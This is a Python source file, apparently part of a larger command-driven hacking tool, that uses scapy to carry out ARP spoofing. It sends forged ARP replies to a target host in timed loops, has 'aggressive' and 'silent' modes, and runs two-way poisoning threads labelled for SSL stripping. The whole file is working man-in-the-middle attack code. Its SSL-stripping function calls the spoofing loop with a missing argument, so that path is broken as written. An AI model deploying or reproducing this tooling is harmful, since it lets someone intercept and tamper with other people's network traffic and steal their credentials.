import scapy.all as sc
import shlex
import threading
import time

# ARP spoofing
def arp_spoof (target_ip, spoofed_ip):
    packet = sc.ARP(op=2, pdst=target_ip, psrc=spoofed_ip)
    sc.send(packet, verbose=False)

# Continuously send ARP spoofing packets
def arp_spoof_loop(ip, iptospoof, interval):
    print("[*] Spoofing %s as %s ..." % (ip, iptospoof))
    while True:
        arp_spoof(ip, iptospoof)
        time.sleep(interval)
        print("Spoofing...")

# Basic ARP poisoning function
def start_arp_poison(cmd):
    args = shlex.split(cmd)
    ip = iptospoof =  None
    interval = 5 # default value
    for i, arg in enumerate(args):
        if arg == "-tgtip" and i + 1 < len(args):
            ip = args[i + 1]
        elif arg == "-spip" and i + 1 < len(args):
            iptospoof = args[i + 1]
        elif arg == "-mode" and i + 1 < len(args):
            mode = args[i + 1]
            if mode == "aggresive":
                interval = 1
            elif mode == "silent":
                interval = 10
    if not ip or not iptospoof:
        print("[!] Usage: arp_poison -tgtip <target_ip> -spip <spoofed_ip>")
        return
    print("[*] Spoofing %s as %s..." % (ip, iptospoof))

    arp_thread = threading.Thread(target=arp_spoof_loop, args=(ip, iptospoof, interval))
    arp_thread.daemon = True
    arp_thread.start()

# ARP poisoning for SSL stripping
def start_arp_poison_ssl(cmd):
    args = shlex.split(cmd)
    ip = iptospoof = None
    for i, arg in enumerate(args):
        if arg == "-tgtip" and i + 1 < len(args):
            ip = args[i + 1]
        elif arg == "-spip" and i + 1 < len(args):
            iptospoof = args[i + 1]
    if not ip or not iptospoof:
        print("[!] Usage: arp_poison -tgtip <target_ip> -spip <spoofed_ip>")
        return
    print("[*] Spoofing %s as %s ..." % (ip, iptospoof))

    arp_thread = threading.Thread(target=arp_spoof_loop, args=(ip, iptospoof))
    arp_thread.daemon = True
    arp_thread.start()

    arp_thread = threading.Thread(target=arp_spoof_loop, args=(iptospoof, ip))
    arp_thread.daemon = True
    arp_thread.start()

# Starts a thread that performs ARP spoofing sending a limited number of packets.
def start_arp_thread(target_ip, spoofed_ip, count):
    arp_thread = threading.Thread(target=arp_limited_spoof_loop, args=(target_ip, spoofed_ip, count))
    arp_thread.daemon = True
    arp_thread.start()

# Performs ARP spoofing sending a limited number packets.
def arp_limited_spoof_loop(ip, spoofed_ip, count):
    print("[*] Spoofing %s as %s ..." % (ip, spoofed_ip))
    
    for i in range(count):
        arp_spoof(ip, spoofed_ip)
        time.sleep(1)
        
    print("ARP Poison to %s complete" % ip)
    
    


